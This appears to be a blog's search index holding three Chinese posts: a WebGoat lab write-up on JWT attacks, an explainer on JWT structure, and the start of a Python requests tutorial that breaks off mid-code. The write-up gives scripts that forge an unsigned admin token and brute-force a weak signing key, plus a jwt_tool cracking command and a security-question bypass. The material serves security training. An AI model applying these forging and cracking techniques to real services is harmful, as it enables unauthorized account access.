<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/"/>
      <url>/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="JWT的攻击方法"><a href="#JWT的攻击方法" class="headerlink" title="JWT的攻击方法"></a>JWT的攻击方法</h2><h3 id="webgoat靶场搭建"><a href="#webgoat靶场搭建" class="headerlink" title="webgoat靶场搭建"></a>webgoat靶场搭建</h3><p>我用的是docker搭建，这样快一点，也可以在GitHub上下载了直接拖到kali里，但是很慢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull webgoat/webgoat-8.0    拉取docker</span><br><span class="line">docker images     查看容器是否下载成功</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230620104650145.png"><br>运行靶场</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -p 8080:8080 -t webgoat/webgoat-8.0 </span><br></pre></td></tr></table></figure><p>之后通过浏览器访问 <code>http://127.0.0.1:8080/WebGoat</code> 就可以了</p><p>在宿主机上也能访问<code>http://192.168.144.128:8080/WebGoat</code>，方便抓包</p><p>github官方连接，也可以直接下载拖到kali上<a href="https://github.com/WebGoat/WebGoat/releases">Releases · WebGoat&#x2F;WebGoat (github.com)</a></p><p><img src="http://pic.bamboo22.top/image-20230620104946666.png"></p><p><img src="http://pic.bamboo22.top/image-20230620105023348.png"></p><p>第一次进去要注册，之后登录就可以用了</p><h3 id="空加密验证攻击"><a href="#空加密验证攻击" class="headerlink" title="空加密验证攻击"></a>空加密验证攻击</h3><p><img src="http://pic.bamboo22.top/image-20230620111115257.png"></p><p>打开JWT tokens的第4部分</p><p>点击vote now 弹窗提示我们游客不能投票，需要登录</p><p>这关的要求是切换到管理员身份就能重置投票</p><p><img src="http://pic.bamboo22.top/image-20230620111411253.png"></p><p>点击切换到Tom并抓包</p><p><img src="http://pic.bamboo22.top/image-20230620121908728.png"></p><p>抓包后能看到token值 （这里记得多抓几次，有些时候看不到）</p><p><img src="http://pic.bamboo22.top/image-20230620122439982.png"></p><p>然后将这个值拿到解析网站去解析<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p><p><img src="http://pic.bamboo22.top/image-20230620122556951.png"></p><p>可以看出，这里采用了hs512算法进行加密验证，然后用户名是Tom。 那么，接下来我们尝试一下利用空加密进行绕过！！！</p><p>具体的exp代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64urlencode</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(data).replace(<span class="string">b&#x27;+&#x27;</span>, <span class="string">b&#x27;-&#x27;</span>).replace(<span class="string">b&#x27;/&#x27;</span>, <span class="string">b&#x27;_&#x27;</span>).replace(<span class="string">b&#x27;=&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b64urlencode(<span class="string">b&#x27;&#123;&quot;alg&quot;:&quot;none&quot;&#125;&#x27;</span>)+<span class="string">b&#x27;.&#x27;</span>+b64urlencode(<span class="string">b&#x27;&#123;&quot;iat&quot;:1573470025,&quot;admin&quot;:&quot;true&quot;,&quot;user&quot;:&quot;Jerry&quot;&#125;&#x27;</span>)+<span class="string">b&#x27;.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行结果：</span><br><span class="line">eyJhbGciOiJub25lIn0.eyJpYXQiOjE1NzM0NzAwMjUsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJKZXJyeSJ9.</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230620122856301.png"></p><p>看到这里，我们将admin对应的值更改为了true ， 也就是说此时，我们设置了Jerry这个用户为admin。 然后由于还设置了alg为空密码，因此，可以绕过签名密钥未知的情况！！！ 那么，我们把之前抓到的包放出去看看：</p><p><img src="http://pic.bamboo22.top/image-20230620123037686.png"></p><p>可以看到已经重置投票了</p><p><img src="http://pic.bamboo22.top/image-20230620123359767.png"></p><h3 id="字典爆破"><a href="#字典爆破" class="headerlink" title="字典爆破"></a>字典爆破</h3><p>对 JWT 的密钥爆破需要在一定的前提下进行：</p><ul><li>知悉JWT使用的加密算法</li><li>一段有效的、已签名的token</li><li>签名用的密钥不复杂（弱密钥）</li></ul><p>进入下一关，看到题目描述是去找到秘钥，提交一个新的key，将username改为WebGoat</p><p><img src="http://pic.bamboo22.top/image-20230620154547838.png"></p><p>先把token丢到加密网站看看是什么内容</p><p><img src="http://pic.bamboo22.top/image-20230620154943362.png"></p><p>接下来我们需要爆破私钥</p><p>我使用的是JWT_tool爆破</p><p><a href="http://t.csdn.cn/y9B86">JWT攻击手册(附jwt_tool用法,爆破弱密钥等)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jwt_tool.py JWT_HERE -C -d dictionary.txt     用dictionary.txt作为字典爆破</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230620172719645.png"></p><p>得到key的值是<code>available</code></p><p>在这里我找字典找了很久，最后在这里找到<a href="https://github.com/TheKingOfDuck/fuzzDicts">TheKingOfDuck&#x2F;fuzzDicts: Web Pentesting Fuzz (github.com)</a></p><p>也可以跑python脚本，网上找到的python脚本，但是我跑的时候一直报错，还没解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> termcolor</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    jwt_str = <span class="string">R&#x27;eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY3MDc2NTAzOCwiZXhwIjoxNjcwNzY1MDk4LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.aIR7sjd5o7XJgUkYPCw76e9iF838G-Hh9J-sN1M-J94&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;top1000.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            key_ = line.strip()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=key_)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bbingo! found key --&gt;&#x27;</span>, termcolor.colored(key_, <span class="string">&#x27;green&#x27;</span>), <span class="string">&#x27;&lt;--&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bbingo! found key --&gt;&#x27;</span>, termcolor.colored(key_, <span class="string">&#x27;green&#x27;</span>), <span class="string">&#x27;&lt;--&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27; &#x27;</span> * <span class="number">64</span>, <span class="string">&#x27;\r\btry&#x27;</span>, key_, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bsorry! no key be found.&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到key后修改内容</p><p><img src="http://pic.bamboo22.top/image-20230620173102617.png"></p><p>这道题还设置了时间戳，将exp中的时间即过期时间，将其设置为一个当前时间之后的数</p><p><img src="http://pic.bamboo22.top/image-20230620173338087.png"></p><p>成功</p><p><img src="http://pic.bamboo22.top/image-20230620173318200.png"></p><h3 id="认证-键值逻辑"><a href="#认证-键值逻辑" class="headerlink" title="认证-键值逻辑"></a>认证-键值逻辑</h3><p><img src="http://pic.bamboo22.top/image-20230621164429911.png"></p><p>这一关应该是一个真实案例，一个应用键值逻辑来绕过的例子</p><p><img src="http://pic.bamboo22.top/image-20230621164902180.png"></p><p>下面这个问题描述，大概意思就是你要重置密码，但是用的是无法识别的设备或地址，需要回答验证问题，但是你忘了你设置的答案</p><p>看一下源码：</p><p><img src="http://pic.bamboo22.top/8249cc0956ef4a23802d72759dd50b5f.png"></p><p>这里可以看出来，一共有两个问题并且有相应的答案。 那么试想一下，如果我们查询secQuestion2， 则由于数据库里无secQuestion2的字段，那么当我们查询的时候则对应的secQuestion2的值就为none，或者其他的什么    因此，我们可以尝试一下设置：</p><p><img src="http://pic.bamboo22.top/fcaa473f9cc643c8b8478723642cd262.png"><br>将两个问题都改为none</p><p><img src="http://pic.bamboo22.top/image-20230621170933205.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/01/22/JWT/"/>
      <url>/2024/01/22/JWT/</url>
      
        <content type="html"><![CDATA[<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><h2 id="什么是JWT"><a href="#什么是JWT" class="headerlink" title="什么是JWT"></a>什么是JWT</h2><h3 id="JWT介绍"><a href="#JWT介绍" class="headerlink" title="JWT介绍"></a>JWT介绍</h3><blockquote><p>JSON Web Token（JSON Web令牌）</p></blockquote><p><img src="http://pic.bamboo22.top/120.png"></p><p>**JWT(json web token)**是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准。 JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源。比如用户登录。在传统的用户登录认证中，因为http是无状态的，所以都是采用session方式。用户登录成功，服务端会保存一个session，服务端会返回给客户端一个sessionId，客户端会把sessionId保存在cookie中，每次请求都会携带这个sessionId。 </p><p><strong>cookie+session</strong>这种模式通常是保存在内存中，而且服务从单服务到多服务会面临的session共享问题。虽然目前存在使用Redis进行Session共享的机制，但是随着用户量和访问量的增加，Redis中保存的数据会越来越多，开销就会越来越大，多服务间的耦合性也会越来越大，Redis中的数据也很难进行管理，例如当Redis集群服务器出现Down机的情况下，整个业务系统随之将变为不可用的状态。而JWT不是这样的，只需要服务端生成token，客户端保存这个token，每次请求携带这个token，服务端认证解析就可。</p><h3 id="JWT作用："><a href="#JWT作用：" class="headerlink" title="JWT作用："></a>JWT作用：</h3><ul><li>授权：一旦用户登录，每个后续请求将包括JWT，从而允许用户访问该令牌允许的路由，服务和资源。它的开销很小并且可以在不同的域中使用。如：单点登录。</li><li>信息交换：在各方之间安全地传输信息。JWT可进行签名（如使用公钥&#x2F;私钥对)，因此可确保发件人。由于签名是使用标头和有效负载计算的，因此还可验证内容是否被篡改。</li></ul><h3 id="JWT结构解析"><a href="#JWT结构解析" class="headerlink" title="JWT结构解析"></a>JWT结构解析</h3><h4 id="header"><a href="#header" class="headerlink" title="header"></a>header</h4><p>jwt的头部承载两部分信息： </p><ol><li><p>声明类型，这里是jwt </p></li><li><p>声明加密的算法 通常直接使用 HMAC SHA256</p><p>完整的头部就像下面这样的JSON：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> </span><br><span class="line">    </span><br><span class="line"><span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后将头部进行base64加密（该加密是可以对称解密的),构成了第一部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><br></pre></td></tr></table></figure></li></ol><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>载荷就是存放有效信息的地方。这个名字像是特指飞机上承载的货品，这些有效信息包含三个部分：标准中注册的声明、公共的声明、私有的声明。</p><ol><li><p>标准中注册的声明 (建议但不强制使用) ：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iss<span class="punctuation">:</span> jwt签发者</span><br><span class="line">sub<span class="punctuation">:</span> jwt所面向的用户 </span><br><span class="line">aud<span class="punctuation">:</span> 接收jwt的一方 </span><br><span class="line">exp<span class="punctuation">:</span> jwt的过期时间，这个过期时间必须要大于签发时间</span><br><span class="line">nbf<span class="punctuation">:</span> 定义在什么时间之前，该jwt都是不可用的.</span><br><span class="line">iat<span class="punctuation">:</span> jwt的签发时间</span><br><span class="line">jti<span class="punctuation">:</span> jwt的唯一身份标识，主要用来作为一次性token<span class="punctuation">,</span>从而回避重放攻击。</span><br></pre></td></tr></table></figure></li><li><p>公共的声明 ： 公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密。</p></li><li><p>私有的声明 ： 私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。</p><p>定义一个payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> </span><br><span class="line">   </span><br><span class="line"><span class="attr">&quot;uid&quot;</span><span class="punctuation">:</span><span class="string">&quot;e12a34b56c78d9e0f&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;ramostear&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后将其进行base64加密，得到Jwt的第二部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJvcmciOiLku4rml6XlpLTmnaEiLCJuYW1lIjoiRnJlZeeggeWGnCIsImV4cCI6MTUxNDM1NjEwMywiaWF0IjoxNTE0MzU2MDQzLCJhZ2UiOiIyOCJ9</span><br></pre></td></tr></table></figure></li></ol><h4 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h4><p> jwt的第三部分是一个签证信息，这个签证信息由三部分组成：header (base64后的)、 payload (base64后的)、secret。 这个部分需要base64加密后的header和base64加密后的payload使用。连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">base64UrlEncode(payload)<span class="punctuation">,</span></span><br><span class="line">secret)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">49UF72vSkj-sA4aHHiYN5eoZ9Nb4w5Vb45PsLF7x_NY</span><br></pre></td></tr></table></figure><p>密钥secret是保存在服务端的，服务端会根据这个密钥进行生成token和验证，所以需要保护好。</p><p>下图为一个JWT生成流程示例：</p><p><img src="http://pic.bamboo22.top/image-20230619102906786.png"></p><h3 id="JWT认证流程"><a href="#JWT认证流程" class="headerlink" title="JWT认证流程"></a>JWT认证流程</h3><p>在身份验证中，当用户成功登录系统时，授权服务器将会把 JSON Web Token 返回给客户端，用户需要将此凭证信息存储在本地(cookie或浏览器缓存)。当用户发起新的请求时，需要在请求头中附带此凭证信息，当服务器接收到用户请求时，会先检查请求头中有无凭证，是否过期，是否有效。如果凭证有效，将放行请求；若凭证非法或者过期，服务器将回跳到认证中心，重新对用户身份进行验证，直至用户身份验证成功。以访问 API 资源为例，下图显示了获取并使用 JWT 的基本流程：</p><p><img src="http://pic.bamboo22.top/1200-16871417935843.png"></p><ol><li>用户使用账号和密码登录，调用后端登录接口；</li><li>后端登录程序生成jwt(注意这里小写指的是具体的token)，这一步通常是由jwt插件完成的，我们只需要配置jwt加密密钥、token刷新时间、token有效时间；</li><li>后端返回jwt给前端；</li><li>前端之后的请求直接带上token即可，只要在token的有效期内；</li><li>后端收到前端的请求，会验证token的合法性、有效性，验证通过之后处理请求；</li><li>后端发送响应给前端。</li></ol><h3 id="JWT的利弊"><a href="#JWT的利弊" class="headerlink" title="JWT的利弊"></a>JWT的利弊</h3><p>1、 使用 JWT 的优势 使用 JSON Web Token 保护应用安全，你至少可以获得以下几个优势：</p><ul><li>更少的<a href="https://cloud.tencent.com/solution/database?from=20065&from_column=20065">数据库</a>连接：因其基于算法来实现身份认证，在使用 JWT 时查询数据的次数更少(更少的数据连接不等于不连接数据库)，可以获得更快的系统响应时间。构建更简单：如果你的应用程序本身是无状态的，那么选择 JWT 可以加快系统构建过程。 </li><li>跨服务调用：你可以构建一个认证中心来处理用户身份认证和发放签名的工作，其他应用服务在后续的用户请求中不需要(理论上)在询问认证中心，可使用自有的公钥对用户签名进行验证。 </li><li>无状态：你不需要向传统的 Web 应用那样将用户状态保存于 Session 中。</li></ul><p>2、使用 JWT 的弊端</p><ul><li>严重依赖于秘钥：JWT 的生成与解析过程都需要依赖于秘钥(Secret)，且都以硬编码的方式存在于系统中(也有放在外部配置文件中的)。如果秘钥不小心泄露，系统的安全性将收到威胁。 </li><li>服务端无法管理客户端的信息：如果用户身份发生异常(信息泄露，或者被攻击)，服务端很难向操作 Session 那样主动将异常用户进行隔离。 </li><li>服务端无法主动推送消息：服务端由于是无状态的，他将无法使用像 Session 那样的方式推送消息到客户端，例如过期时间将至，服务端无法主动为用户续约，需要客户端向服务端发起续约请求。 </li><li>冗余的数据开销：一个 JWT 签名的大小要远比一个 Session ID 长很多，如果你对有效载荷(payload)中的数据不做有效控制，其长度会成几何倍数增长，且在每一次请求时都需要负担额外的网络开销。 </li><li>JSON Web Token 很流行，但是它相比于 Session,OIDC(OpenId Connect)等技术还比较新，支持 JSON Web Token 的库还比较少，而且 JWT 也并非比传统 Session 更安全，他们都没有解决 CSRF 和 XSS 的问题。因此，在决定使用 JWT 前，你需要仔细考虑其利弊。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL盲注脚本编写</title>
      <link href="/2024/01/22/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/"/>
      <url>/2024/01/22/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL盲注脚本编写"><a href="#SQL盲注脚本编写" class="headerlink" title="SQL盲注脚本编写"></a>SQL盲注脚本编写</h1><h2 id="Python-requests-模块"><a href="#Python-requests-模块" class="headerlink" title="Python requests 模块"></a>Python requests 模块</h2><p>Python requests 是一个常用的 HTTP 请求库，可以方便地向网站发送 HTTP 请求，并获取响应结果。</p><p>requests 模块比 <a href="https://www.runoob.com/python3/python-urllib.html">urllib</a> 模块更简洁。</p><p>使用 requests 发送 HTTP 请求需要先导入 requests 模块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br></pre></td></tr></table></figure><p>导入后就可以发送 HTTP 请求，使用 requests 提供的方法向指定 URL 发送 HTTP 请求，例如：</p><p><strong>实例:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">\<span class="comment"># 导入 requests 包</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">\<span class="comment"># 发送请求</span></span><br><span class="line">x = requests.get(<span class="string">&#x27;https://www.runoob.com/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># 返回网页内容</span></span><br><span class="line"><span class="built_in">print</span>(x.text)</span><br></pre></td></tr></table></figure><p>每次调用 requests 请求之后，会返回一个 response 对象，该对象包含了具体的响应信息，如状态码、响应头、响应内容等：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(response.status_code)  <span class="comment"># 获取响应状态码</span></span><br><span class="line"><span class="built_in">print</span>(response.headers)  <span class="comment"># 获取响应头</span></span><br><span class="line"><span class="built_in">print</span>(response.content)  <span class="comment"># 获取响应内容</span></span><br></pre></td></tr></table></figure><p><strong>更多响应信息如下：</strong></p><table><thead><tr><th align="left">属性或方法</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">apparent_encoding</td><td align="left">编码方式</td></tr><tr><td align="left">close()</td><td align="left">关闭与服务器的连接</td></tr><tr><td align="left">content</td><td align="left">返回响应的内容，以字节为单位</td></tr><tr><td align="left">cookies</td><td align="left">返回一个 CookieJar 对象，包含了从服务器发回的 cookie</td></tr><tr><td align="left">elapsed</td><td align="left">返回一个 timedelta 对象，包含了从发送请求到响应到达之间经过的时间量，可以用于测试响应速度。比如 r.elapsed.microseconds 表示响应到达需要多少微秒。</td></tr><tr><td align="left">encoding</td><td align="left">解码 r.text 的编码方式</td></tr><tr><td align="left">headers</td><td align="left">返回响应头，字典格式</td></tr><tr><td align="left">history</td><td align="left">返回包含请求历史的响应对象列表（url）</td></tr><tr><td align="left">is_permanent_redirect</td><td align="left">如果响应是永久重定向的 url，则返回 True，否则返回 False</td></tr><tr><td align="left">is_redirect</td><td align="left">如果响应被重定向，则返回 True，否则返回 False</td></tr><tr><td align="left">iter_content()</td><td align="left">迭代响应</td></tr><tr><td align="left">iter_lines()</td><td align="left">迭代响应的行</td></tr><tr><td align="left">json()</td><td align="left">返回结果的 JSON 对象 (结果需要以 JSON 格式编写的，否则会引发错误)</td></tr><tr><td align="left">links</td><td align="left">返回响应的解析头链接</td></tr><tr><td align="left">next</td><td align="left">返回重定向链中下一个请求的 PreparedRequest 对象</td></tr><tr><td align="left">ok</td><td align="left">检查 “status_code” 的值，如果小于400，则返回 True，如果不小于 400，则返回 False</td></tr><tr><td align="left">raise_for_status()</td><td align="left">如果发生错误，方法返回一个 HTTPError 对象</td></tr><tr><td align="left">reason</td><td align="left">响应状态的描述，比如 “Not Found” 或 “OK”</td></tr><tr><td align="left">request</td><td align="left">返回请求此响应的请求对象</td></tr><tr><td align="left">status_code</td><td align="left">返回 http 的状态码，比如 404 和 200（200 是 OK，404 是 Not Found）</td></tr><tr><td align="left">text</td><td align="left">返回响应的内容，unicode 类型数据</td></tr><tr><td align="left">url</td><td align="left">返回响应的 URL</td></tr></tbody></table><p><strong>实例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 requests 包</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求</span></span><br><span class="line">x = requests.get(<span class="string">&#x27;https://www.runoob.com/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回 http 的状态码</span></span><br><span class="line"><span class="built_in">print</span>(x.status_code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 响应状态的描述</span></span><br><span class="line"><span class="built_in">print</span>(x.reason)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回编码</span></span><br><span class="line"><span class="built_in">print</span>(x.apparent_encoding)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">200</span></span><br><span class="line">OK</span><br><span class="line">utf-<span class="number">8</span></span><br></pre></td></tr></table></figure><p><strong>requests 方法：</strong></p><table><thead><tr><th align="left">方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">delete(<em>url</em>, <em>args</em>)</td><td align="left">发送 DELETE 请求到指定 url</td></tr><tr><td align="left">get(<em>url</em>, <em>params, args</em>)</td><td align="left">发送 GET 请求到指定 url</td></tr><tr><td align="left">head(<em>url</em>, <em>args</em>)</td><td align="left">发送 HEAD 请求到指定 url</td></tr><tr><td align="left">patch(<em>url</em>, <em>data, args</em>)</td><td align="left">发送 PATCH 请求到指定 url</td></tr><tr><td align="left">post(<em>url</em>, <em>data, json, args</em>)</td><td align="left">发送 POST 请求到指定 url</td></tr><tr><td align="left">put(<em>url</em>, <em>data, args</em>)</td><td align="left">发送 PUT 请求到指定 url</td></tr><tr><td align="left">request(<em>method</em>, <em>url</em>, <em>args</em>)</td><td align="left">向指定的 url 发送指定的请求方法</td></tr></tbody></table><p>使用 requests.request() 发送 get 请求：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 requests 包</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求</span></span><br><span class="line">x = requests.request(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;https://www.runoob.com/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回网页内容</span></span><br><span class="line"><span class="built_in">print</span>(x.status_code)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">200</span></span><br></pre></td></tr></table></figure><p>设置请求头：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 requests 包</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">kw = &#123;<span class="string">&#x27;s&#x27;</span>:<span class="string">&#x27;python 教程&#x27;</span>&#125;</span><br><span class="line"></span><br><span 